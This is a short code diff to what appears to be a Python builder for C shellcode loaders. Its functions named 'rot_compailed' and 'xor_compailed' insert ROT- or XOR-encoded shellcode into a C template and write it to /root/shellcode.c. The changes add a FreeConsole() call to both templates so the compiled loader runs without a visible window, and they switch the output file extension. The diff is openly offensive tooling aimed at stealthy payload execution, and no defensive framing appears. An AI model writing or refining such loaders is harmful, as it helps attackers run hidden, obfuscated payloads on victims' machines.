@@ -12,6 +12,8 @@ def rot_compailed(shellcode_size, shellcode):
         #include <string.h>
         
         int main(int argc, char* argv[]) {
+
+            FreeConsole();
                                
             char default_shell[] ;
               
@@ -40,7 +42,7 @@ def rot_compailed(shellcode_size, shellcode):
     '''
 
     loads = load.replace('default_shell[]', shellcode, 1)
-    with open('/root/shellcode.cpp', 'w+') as f:
+    with open('/root/shellcode.c', 'w+') as f:
         f.write(loads)
 
 
@@ -51,6 +53,8 @@ def xor_compailed(shellcode_size, shellcode):
         #include <string.h>
         
         int main(int argc, char* argv[]) {
+
+            FreeConsole();
                                
             char default_shell[] ;
               
